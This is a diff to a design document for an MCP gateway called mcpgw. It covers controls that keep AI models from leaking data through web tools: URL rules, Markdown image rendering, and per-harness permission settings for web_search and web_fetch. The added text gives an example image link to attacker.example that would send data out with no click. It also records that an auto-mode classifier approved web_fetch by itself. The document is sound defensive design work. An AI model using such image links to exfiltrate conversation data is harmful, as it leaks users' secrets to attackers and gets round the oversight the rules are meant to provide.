@@ -24,10 +24,14 @@ returned by `web_search` in that meeting. Links inside fetched pages and URLs th
 refusal goes back to the model as a tool error. This is the strict side of Anthropic's rule, chosen because of the
 report above.
 
+**Apps that render a model's Markdown don't load images.** A model could write `![](https://attacker.example/?data=…)`, and
+the browser would send that with no click at all, getting around the URL rule. homestorm had this, and fixed it at M5.
+
 **Harnesses** let `web_search` run freely, and `web_fetch` ask each time, because those sessions can see code and
 secrets:
 
-- Claude Code: allow only `mcp__mcpgw__web_search`.
+- Claude Code: allow `mcp__mcpgw__web_search`, and put `mcp__mcpgw__web_fetch` under `ask`. An `ask` rule is needed, not
+  just leaving it off the allow list: in `auto` mode the classifier approved `web_fetch` by itself.
 - Codex: `tools.web_fetch.approval_mode = "prompt"`.
 
 **mcpgw** does what it can without knowing the conversation: a 250-character URL limit, no credentials in URLs, `GET`
@@ -55,5 +59,6 @@ state, not leaks, and it's why Codex needs the setting above.
 - Every new app must implement the rule. The design says so, and mcpgw can't check it.
 - **Search queries can leak too,** but they go to search engines rather than an address an attacker reads, so
   `web_search` runs freely.
-- Unattended harness runs can't use `web_fetch`: `codex exec` should refuse it, going by the approval error seen in
-  testing. That `prompt` asks in interactive sessions hasn't been tested yet; M6 checks it.
+- Unattended harness runs can't use `web_fetch`. Tested: `codex exec` refuses it, an interactive Codex session asks first,
+  and `claude -p` with the `ask` rule denies it.
+- **Harness models prefer their own search anyway,** so the harness rule mostly matters when mcpgw is named.
